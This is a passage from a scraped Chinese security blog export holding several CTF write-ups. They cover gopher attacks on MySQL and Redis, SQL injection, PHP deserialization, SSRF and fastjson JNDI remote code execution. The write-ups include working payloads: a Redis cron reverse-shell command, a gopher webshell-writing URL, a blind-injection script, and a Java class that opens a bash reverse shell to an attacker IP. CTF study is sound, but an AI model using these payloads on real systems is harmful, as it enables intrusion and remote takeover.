打开文件可以看到我们的查询结果 最后写一下遇到的一些问题，如果使用的是mysql8.0.x，有可能无法以root用户远程登录到mysql服务器，跟mysql8默认使用的认证插件有关，在mysql数据库中更改user表的plugin字段为mysql_native_password即可解决，而且mysql8中不能开启skip_grant_tables，不然它连network这一部分也给你关了（买一送一 如果抓包结果中以TLSv1.2协议进行传输数据，是无法看到传输的数据内容的 ，与mysql开启了SSL有关，关了就好，关闭方式为，在配置文件中，增加 12# disable_ssl skip_ssl 重启服务再进行抓包就可以了 这次测试实验只是单纯为了更加深入了解gopher的应用和mysql客户端和服务端的通信，正常情况几乎都不是这样子利用 利用gopher协议攻击Redisredis一般运行在6379端口，如果扫到这个端口开着，就很可能是redis，可以尝试利用，一般利用方式是写入Crontab定时反弹shell 一般攻击流程： 12345redis-cli flushallecho -e &quot;\\n\\n*\\1 * * * * bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;1234 0&gt;&amp;1\\n\\n&quot; | redis-cli -x set 1redis-cli config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;redis-cli config set dbfilename rootredis-cli save flushall删除数据库中的所有key redis-cli -x：-x参数表示从标准输入读取参数，这里添加了一个key为1，值为定时任务的字段 dir,dbfilename: redis的配置，dir是数据库备份文件放置路径，dbfilename是备份文件名字 save:立即对此时的数据进行备份，redis数据备份有触发条件，具体看配置文件，这个命令主要让数据库马上进行备份 下载测试的redis wget http://download.redis.io/releases/redis-2.8.17.tar.gz 编译完成后，开启redis服务 用socat开一个端口转发，并获取数据包，命令如下 socat -v tcp-listen:1234,fork,reuseaddr tcp:localhost:6379 将本地的1234端口的数据转发到6379端口，之后用redis-cli客户端连接端口1234，执行攻击流程，我们就可以获取攻击的数据 攻击的数据 接着将这些数据转为gopher协议的url： 舍弃开头为&lt;或&gt;的数据，这些表示请求和返回 舍弃开头为+OK的数据，表示返回的信息 将\\r改为%0d，将换行改为%0a $进行url编码 或者可以使用工具生成payload 1curl gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 待补充。。。 参考： SSRF利用 Gopher 协议拓展攻击面_BerL1n的博客-CSDN博客 10.Redis未授权访问漏洞复现与利用 - bmjoker - 博客园 解决Mysql8+版本远程连接问题（亲测有效） - 程序员大本营","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"}]},{"title":"DASCTF 三月赛 web题复现","slug":"DASCTF-三月赛-web题复现","date":"2021-04-07T07:04:52.000Z","updated":"2021-09-22T09:57:23.603Z","comments":true,"path":"2021/04/07/DASCTF-三月赛-web题复现/","link":"","permalink":"https://123-prog.github.io/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/","excerpt":"BestDB0x01源码给了查询语句 1$sql = &quot;SELECT * FROM users WHERE id = &#x27;$query&#x27; OR username = \\&quot;$query\\&quot;&quot;;","text":"BestDB0x01源码给了查询语句 1$sql = &quot;SELECT * FROM users WHERE id = &#x27;$query&#x27; OR username = \\&quot;$query\\&quot;&quot;; 过滤单引号，但没过滤双引号，所以选择闭合后面的用户名进行union查询 查表名 12query=-1&quot;/**/union/**/select/**/group_concat(table_name),2,3/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23//f1agdas,users 查字段 12query=-1&quot;/**/union/**/select/**/group_concat(column_name),2,3/**/from/**/information_schema.columns/**/where/**/table_name=&quot;f1agdas&quot;%23//id,f1agdas 查数据 12query=-1&quot;/**/union/**/select/**/f1agdas,2,3/**/from/**/f1agdas%23//flag.txt 返回一个文件名，使用load_file读取/flag.txt获得flag，flag被过滤了，可以使用16进制编码绕过 1query=-1&quot;/**/union/**/select/**/load_file(0x2F666C61672E747874),2,3%23 ez_serialize0x01题目给了源码，序列化的题目，但是源码中并没有可以利用的类，所以是php原生类的利用 spl,标准php类库，里面存着一些php原生类，其中有可以遍历目录或读取文件 DirectoryIterator 遍历目录 直接echo会输出目录下的.(即表示当前目录的符号) FilesystemIterator 遍历目录 直接echo会输出目录下第一个文件夹或文件名 SplFileObject 读取文件内容，按行读取，跨行需要遍历 源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; public $class; public $para; public $check; public function __construct() &#123; $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); &#125; public function __wakeup() &#123; $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; echo new $this-&gt;class ($this-&gt;para); &#125; else die(&#x27;bad hacker~&#x27;); &#125;&#125;class B&#123; var $a; public function __construct($a) &#123; $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); &#125;&#125;class C&#123; function vaild($code)&#123; $pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\\&#x27;|&quot;|:|;|?]/i&#x27;; if (preg_match($pattern, $code))&#123; return false; &#125; else return true; &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new A;&#125; 利用原生类先读取var/www/html下文件 123456789&lt;?phpclass A&#123; public $class = &#x27;FilesystemIterator&#x27;; public $para = &#x27;/var/www/html&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125; 提交 12?pop=O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;//1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE 读取获得的这个目录 123456789&lt;?phpclass A&#123; public $class = &#x27;FilesystemIterator&#x27;; public $para = &#x27;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:47:&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&quot;;s:5:&quot;check&quot;;N;&#125; 提交后输出了flag.php 最后读取flag.php 123456789&lt;?phpclass A&#123; public $class = &#x27;SplFileObject&#x27;; public $para = &#x27;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.phpssss&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:56:&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125; 在源码可以看到flag ez_login比赛的时候没做出了，也没来得及复现环境就关了，看了别的师傅的writeup，主要记录一下前面绕过session检测的方法，后面就是一个sql盲注 源码 1234567891011121314151617181920212223&lt;?php if(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;); &#125; include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET[&#x27;url&#x27;]; if(check_inner_ip($url))&#123; if($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); &#125; &#125;else&#123; echo &quot;Your IP is internal yoyoyo&quot;; &#125;?&gt; 题目思路是通过ssrf去访问到后台的admin.php，然后进行sql注入拿flag 由源码可以看到，必须要存在session会话才可以进行下一步的ssrf 利用PHP_SESSION_UPLOAD_PROGRESS可以绕过，php在文件上传的时候，会在session中存放上传文件的信息，包括上传进度，文件名等等，当然，文件上传成功后就会被删除，但这里其实可以利用，只要我们上传一个足够大的文件，利用条件竞争的话，再搭配文件包含漏洞，就有可能将恶意代码注入应用程序，这个之后研究 在配置中，session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控，这样我们就可以随意构造一个PHPSESSID，这样就成功获得了一个会话 测试代码 12345678&lt;?phpif(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;);&#125;else&#123; echo &quot;you are successful&quot;;&#125; 脚本 1234567891011import requestssession = requests.Session()url = &quot;http://127.0.0.1/1.php&quot;myData = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;nappingCat&#x27;&#125;myFile = &#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,&#x27;somethingnotimportant&#x27;)&#125;myCookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;nappingCat&#x27;&#125;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;r = session.post(url=url, data=myData, files=myFile, cookies=myCookie, proxies=proxies, verify=False) 利用bp抓包 可以在自己的服务器存放session的目录下看到文件 文件内容是空的，因为已经上传结束了","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"DASCTF","slug":"DASCTF","permalink":"https://123-prog.github.io/tags/DASCTF/"}]},{"title":"(网鼎杯 2018)Fakebook","slug":"网鼎杯-2018-Fakebook","date":"2021-04-05T06:23:57.000Z","updated":"2021-09-22T09:57:07.353Z","comments":true,"path":"2021/04/05/网鼎杯-2018-Fakebook/","link":"","permalink":"https://123-prog.github.io/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/","excerpt":"0x01join创建一个账号，登录，在这个页面存在sqli /view.php?no=1 过滤了union select，使用union all select可以","text":"0x01join创建一个账号，登录，在这个页面存在sqli /view.php?no=1 过滤了union select，使用union all select可以 爆表名 12/view.php?no=-1/**/union/**/all/**/select 1,group_concat(table_name),3,4/**/from information_schema.tables/**/where/**/table_schema=database()#/*users*/ 爆字段名 12/view.php?no=-1/**/union/**/all/**/select 1,group_concat(column_name),3,4/**/from information_schema.columns/**/where/**/table_name=&#x27;users&#x27;#/*no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS*/ 这里的data对应我们创建账号时输入的博客 试着查询一下 12/view.php?no=-1/**/union/**/all/**/select/**/1,data,3,4/**/from/**/users/**/limit 0,1#/*O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:8:&quot;1212.com&quot;;&#125;*/ 得到一串序列化内容 0x02根目录存在robots.txt文件，发现源码文件名 12User-agent: *Disallow: &#x2F;user.php.bak 下载源码 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 注意get方法，存在ssrf漏洞，而数据库中以一串序列化数据存放这个用户信息类，查看用户信息时会从数据库中拿出数据进行反序列化，然后获取博客地址的内容 0x03利用，构造序列化串，利用file协议，读取任意文件 payload 1/view.php?no=-1/**/union/**/all/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; web根目录前面sqli时报错会给出 提交payload后看源码，得到一串base64，那就是flag.php的内容，解码得到flag 1PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5Nzk2YTIzNC1mZGIzLTQxNGMtODdjOC03NTgyNWYwZmEzMDl9IjsNCmV4aXQoMCk7DQo&#x3D; 0x04还有一种做法，完全的sqli，不需要利用到反序列化 使用load_file()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"}]},{"title":"VNCTF 2021 realezjvav","slug":"VNCTF-2021-realezjvav","date":"2021-04-04T06:14:24.000Z","updated":"2021-09-22T10:03:00.316Z","comments":true,"path":"2021/04/04/VNCTF-2021-realezjvav/","link":"","permalink":"https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/","excerpt":"0x01 第一关sql注入没有查询的回显，只有一个Only the admin can get the right page提示，应该是需要以admin身份登录，所以需要注入获得密码 尝试报错， 提交username=admin&amp;password=1&#39;返回500 Internal Server Error 提交username=admin&amp;password=1#&#39;回显正常，证明sql语句报错会直接返回500 Internal Server Error","text":"0x01 第一关sql注入没有查询的回显，只有一个Only the admin can get the right page提示，应该是需要以admin身份登录，所以需要注入获得密码 尝试报错， 提交username=admin&amp;password=1&#39;返回500 Internal Server Error 提交username=admin&amp;password=1#&#39;回显正常，证明sql语句报错会直接返回500 Internal Server Error 那就再试试盲注，先跑一下过滤了什么 在密码中如果包含被过滤关键字会返回hacker字样 在burpsuite中用字典跑一下 因为没有具有一定区别的回显，所以布尔盲注可能有点困难，基本可以确定是基于时间的盲注 sleep benchmark都被过滤了，if没有被过滤，那只能尝试笛卡尔积注入，查询多个表组合的笛卡尔积，拖慢查询的速度 这里直接贴脚本，查询tables,tables,tables组合是1秒的延迟，赛后复现查询速度比较稳定，用这个组合也可以，在比赛当天，可能会有点不稳定，需要尝试延迟时间更久的笛卡尔积组合 123456789101112131415161718192021222324252627282930import requestsimport timeurl = &quot;http://86bc3400-4280-4297-9054-69a81218790d.node3.buuoj.cn/user/login&quot;password = &quot;&quot;#no_0ne_kn0w_th1sfor i in range(20): max = 128 min = 32 while True: j = (max + min) &gt;&gt; 1 #print(j) payload = &quot;-1&#x27;/**/if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,(select/**/count(*)/**/from/**/information_schema.tables/**/a,information_schema.tables/**/c,information_schema.tables/**/b),1)#&quot;.format(i,j) data = &#123; &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload &#125; start_time = time.time() r = requests.post(url=url, data=data) end_time = time.time() #print(end_time-start_time) if (end_time-start_time) &gt; 0.7: min = j+1 else: max = j if(max &lt;= min): password += chr(min) print(password) break 得到密码后就可以登录了 0x02 第二关登录成功跳转到一个角色选择页面 用burpsuite抓包，发现请求发送的是json格式数据，八九不离十就是java的反序列化漏洞利用 阅读源码发现有一个文件任意读 熟悉java项目的话，就可以尝试读取一下pom.xml文件，这个文件是使用maven构建java项目时用于声明依赖的地方，通过这个文件就可以看到这个java项目用了什么依赖 /searchimage?img=../../../../../pom.xml 返回pom.xml内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;springbootdemo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;springbootdemo&lt;/name&gt; &lt;description&gt;vn&amp;apos;s Demo for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;configuration&gt; &lt;configurationFile&gt;src/main/resources/generator/generatorConfig.xml&lt;/configurationFile&gt; &lt;overwrite&gt;true&lt;/overwrite&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.27&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;name&gt;nexus-aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt;&lt;/project&gt; 重点关注里面声明了版本为1.2.27的fastjson依赖，网上搜一下利用方式 红队武器库:fastjson小于1.2.68全漏洞RCE利用exp fastjson-1.2.47-RCE 0x03 fastjson利用对于这个漏洞，大概的利用方式是 我们需要有3部分 一个使用fastjson的环境（传入json，fastjson对其进行解析） 一个RMI/LDAP服务 一个恶意类 我们利用协议，例如ldap协议，向使用fastjson的环境注入一个ldap服务，然后我们在ldap服务上装载一个恶意类，fastjson会加载这个类并进行解析 payload类似这样 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125; ldap://IP:7777/Exploit这里的ip是我们开启的ldap服务所在服务器ip 由于要开启idap服务需要构建啥的，很麻烦，这里就可以用到一个工具 marshalsec-0.0.3-SNAPSHOT-all.jar 用法：Java Unmarshaller Security - Turning your data into code execution 这个工具可以快速开启一个ldap/rmi服务，访问这个服务时可以指定重定向到一个http服务，现在有了这个工具，我们可以进行这样的操作 1.将恶意类放在一个http服务中 2.开启一个ldap服务,装载http服务中的恶意类 3.让受害程序使用fastjson加载我们的ldap服务 0x04 解题一个恶意类示例： Exploit.java 123456789101112public class Exploit &#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/port 0&gt;&amp;1&quot;&#125;); //将这里的ip和端口替换成反弹shell的目的地服务器ip和端口 &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 将这个类跟marshalsec-0.0.3-SNAPSHOT-all.jar放在同一个文件夹下 使用javac生成Exploit.class javac Exploit.java 然后在这个目录下起一个http服务 1python3 -m http.server 80 再利用工具起一个ldap服务 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;ip:80&#x2F;#Exploit&quot; 1389 后面时http服务所在服务器的ip和我们起的http服务的端口80，#Exploit是工具使用的语法，表示在这个地址下的Exploit.class文件，省略后缀写上去，工具会自动进行拼接，端口不指定就默认1389 最后开启监听 1nc -lvvp 9999 现在有三个服务正在跑 123456http服务：Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...ldap服务：Listening on 0.0.0.0:1389nc准备接收反弹的shell：Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999 提交payload 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125; 发现存在过滤，但fastjson比较奇葩，允许你使用unicode编码或16进制编码，它会自动给你解析，所以简单通过unicode绕过 1&#123;&quot;name&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:port/Exploit&quot;,&quot;\\u0061\\u0075\\u0074\\u006f\\u0043\\u006f\\u006d\\u006d\\u0069\\u0074&quot;:true&#125;&#125;&#125; ip:port是ldap服务的服务器ip和端口 发送请求后nc getshell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"java web","slug":"java-web","permalink":"https://123-prog.github.io/tags/java-web/"}]},{"title":"GXYCTF2019 禁止套娃","slug":"GXYCTF2019-禁止套娃","date":"2021-03-10T12:29:49.000Z","updated":"2021-09-22T10:03:21.060Z","comments":true,"path":"2021/03/10/GXYCTF2019-禁止套娃/","link":"","permalink":"https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/","excerpt":"0x01.git源码泄露，利用工具下载源码","text":"0x01.git源码泄露，利用工具下载源码 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 需要绕一下正则，第一个条件限制各种协议 第二个正则匹配替换，?R是递归匹配，表示引用这个式子继续往里面套娃，最后匹配的应该像这样的字符串xxx(xxx(xx(xxx()))),不能存在参数，所以需要利用无参数的代码执行读取flag payload highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 12345localeconv()是一个数组，在这里主要是拿来获取点号，本来的功能无关紧要，pos()就是current()别名，获取数组第一个元素，这里就是点号scandir()得到当前目录内容，可以看到flag.php在数组的倒数第二个，要获取到flag.php，还得利用到array_reverse()对数组逆序处理next()获取数组当前元素的下一个元素，在这里就是第二个元素，flag.php最后highlight_file()搞定 本来利用getcwd()获取当前工作目录应该也可行，但可惜et被第三个正则过滤了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"(RoarCTF 2019) Easy Calc","slug":"RoarCTF-2019-Easy-Calc","date":"2021-03-10T06:46:42.000Z","updated":"2021-09-22T10:03:42.959Z","comments":true,"path":"2021/03/10/RoarCTF-2019-Easy-Calc/","link":"","permalink":"https://123-prog.github.io/2021/03/10/RoarCTF-2019-Easy-Calc/","excerpt":"0x01 php变量解析漏洞起因是get,post或其他方法获取来的变量如果不符合php的变量规则，php会对其进行适当的转换，更改为符合规则的变量名。主要是将某些字符删除或者替换成下划线。接下来看一下主要是哪些字符会引发这个操作","text":"0x01 php变量解析漏洞起因是get,post或其他方法获取来的变量如果不符合php的变量规则，php会对其进行适当的转换，更改为符合规则的变量名。主要是将某些字符删除或者替换成下划线。接下来看一下主要是哪些字符会引发这个操作 